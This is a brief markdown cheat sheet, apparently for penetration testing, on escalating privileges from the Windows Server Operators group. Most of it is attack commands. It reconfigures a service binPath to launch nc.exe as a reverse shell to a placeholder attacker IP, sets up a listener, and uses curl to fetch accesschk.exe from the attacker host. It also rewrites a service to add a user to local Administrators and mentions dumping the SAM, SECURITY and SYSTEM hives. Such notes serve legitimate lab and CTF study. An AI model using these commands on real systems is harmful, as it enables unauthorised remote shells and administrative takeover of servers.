# Server Operators Active Directory Security Group

### Actions that this group performs:

#### 1) Start and stop services

#### 2) Create and delete network shared resources

#### 3) Backup and Restore files (SAM SECURITY SYSTEM hives dump)

#### 4) Sign in to a server interactively

#### 5) Format the hard disk drive of the computer

#### 6) Shutdown the computer

## Exploitation

### Steps:

## TIP: Upload a nc binary or run a powershell reverse shell if we use evil-winrm

Upload a nc binary to target machine 

    Upload /usr/share/windows-resources/binaries/nc.exe .

Configure your nc binary to be executed by a service within the machine

    sc.exe config vss binPath="C:\temp\nc.exe -e cmd.exe ATTACKER_IP PORT"

Setup listener (Attacker machine)

    nc -lvnp PORT 

Restart service to catch reverse shell

    sc.exe stop vss

    sc.exe start vss

## Add our user to Administrators Group

Transfer the SysInternals tool accesschk.exe to target machine

    curl http://ATTACK_IP/accesschk.exe -o c:\temp\accesschk.exe

Check services

    accesschk.exe -cuwqv "user.name" * /accepteula

Check more details about the specific service you want to exploit

    sc qc ServiceName
    accesschk.exe -cuwqv "user.name" ServiceName

If you have the right of "service_all_access" or similar, exploit the service

    sc config ServiceName binPath= "cmd /c net localgroup Administrators user.name /add"

Restart Service for the payload to take effect

    sc stop ServiceName
    sc start ServiceName

Verify escalation

    net localgroup administrators

#### If on RDP, log out, then login and run cmd as administrator to refresh token!

